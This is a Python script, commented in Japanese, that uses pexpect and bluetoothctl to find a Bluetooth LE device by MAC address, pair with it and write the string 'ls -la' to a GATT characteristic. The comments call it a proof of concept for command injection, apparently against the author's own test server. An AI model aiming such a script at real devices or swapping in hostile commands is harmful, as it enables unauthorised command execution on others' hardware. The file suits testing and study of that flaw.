import pexpect
import sys
import time

# ターゲット設定
target_mac = "E4:5F:01:F2:6D:21"

# サーバー側で定義した書き込み用UUID (サーバーのコードと一致させること)
CHAR_UUID = '12345678-1234-5678-1234-56789abcdef1'

# 送信したいコマンド文字列
# 例: 'ls -la' (コマンドインジェクションのPoC用)
MESSAGE = "ls -la"

def str_to_hex_string(s):
    """
    文字列を bluetoothctl が受け付ける Hex形式 ("0x61 0x62 ...") に変換する関数
    """
    return " ".join([f"0x{ord(c):02x}" for c in s])

print("Start bluetoothctl...")
child = pexpect.spawn('bluetoothctl', encoding='utf-8')
child.logfile = sys.stdout

try:
    child.expect('#')

    # 1. スキャンと発見
    print("Start scan...")
    child.sendline('scan on')
    
    # ターゲットが見つかるまで待つ
    index = child.expect([f"Device {target_mac}", pexpect.TIMEOUT], timeout=30)

    if index != 0:
        print("\nTime is out: The target device was not found.")
        sys.exit()

    print(f"\n{target_mac} discovered! Stopping scan...")
    child.sendline('scan off')
    child.expect('#')

    # 2. ペアリング
    print("Trying to pair...")
    child.sendline(f'pair {target_mac}')
    
    # ペアリングの結果待ち
    # "Already exists" と言われる場合もあるのでそれも考慮
    i = child.expect(["Pairing successful", "Paired: yes", "Already exists", "Failed to pair", pexpect.TIMEOUT], timeout=15)
    
    if i in [0, 1, 2]:
        print("\n>>> Pairing/Check Successful! <<<")
    else:
        print("\n>>> Fail to pair. <<<")
        sys.exit()

    # サービスの解決を少し待つ（重要）
    time.sleep(2)

    # 3. GATTメニューへ移動して書き込み
    child.sendline('menu gatt')
    child.expect('#')

    # ターゲット属性（UUID）を選択
    print(f"Selecting attribute: {CHAR_UUID}")
    child.sendline(f'select-attribute {CHAR_UUID}')
    
    # 成功判定のロジックを修正
    # プロンプトの中に "char" と 4桁のHexコード(例: char0068) が含まれていれば成功とみなす
    # 色コードなどの余計な文字があってもヒットするように正規表現を調整
    k = child.expect([
        r"char[0-9a-fA-F]{4}.*#",      # 成功パターン: プロンプトに charXXXX が含まれる
        "No attribute selected",       # 失敗パターン
        pexpect.TIMEOUT
    ], timeout=5)
    
    if k == 0:
        print(">>> Attribute selected successfully! <<<")
        
        # 5. データの書き込み
        hex_data = str_to_hex_string(MESSAGE)
        print(f"Sending data: '{MESSAGE}' -> {hex_data}")
        
        child.sendline(f'write "{hex_data}"')
        
        # 書き込み成功確認
        # "Attempting to write" が出ることもあるので、完了を待つ
        child.expect(["Write successful", "Failed to write"], timeout=5)
        print("\n>>> Data Sent Successfully! <<<")
        
    else:
        print("\n>>> Attribute not found. UUID is correct? <<<")
        # デバッグ用: 何が見えていたかを表示
        print(f"DEBUG info: {child.before}")
 
    # 終了処理
    print("Disconnecting...")
    child.sendline('back') # gattメニューから戻る
    child.sendline('disconnect')
    child.sendline('quit')
    child.close()

except Exception as e:
    print(f"Error: {e}")